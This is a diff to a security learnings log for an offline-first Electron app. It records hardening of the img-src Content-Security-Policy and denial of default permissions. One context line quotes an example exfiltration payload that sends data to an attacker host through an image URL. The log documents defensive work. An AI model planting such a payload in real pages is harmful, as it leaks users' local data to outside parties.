@@ -69,3 +69,8 @@ Replaced `JSON.parse` with `destr` in `safeParse` to mitigate prototype pollutio
 **Vulnerability:** The Electron app's Content-Security-Policy (CSP) allowed `https:` in the `img-src` directive. This could allow an attacker who finds an XSS or HTML injection vulnerability to exfiltrate sensitive local data by appending it to an external image request URL (e.g., `<img src="https://attacker.com/log?data=sensitive" />`).
 **Learning:** Even if `connect-src` is restricted, data exfiltration can still occur through other seemingly harmless directives like `img-src`. Since this is an offline-first app, there is no need to load external images over HTTPS.
 **Prevention:** Strictly limit `img-src` to local origins (`'self'` and `data:`) in offline-first applications.
+
+## 2025-06-29 - [Deny Default Permissions in Electron]
+**Vulnerability:** Electron apps grant certain permissions by default or prompt the user if not handled.
+**Learning:** In offline, local-first applications like this game, no special permissions (camera, microphone, location) are needed. Leaving them unhandled leaves unnecessary attack surface.
+**Prevention:** Explicitly use `session.defaultSession.setPermissionRequestHandler` to return `false` for all permission requests, acting as defense-in-depth. Also, enforce `X-Content-Type-Options: nosniff`.
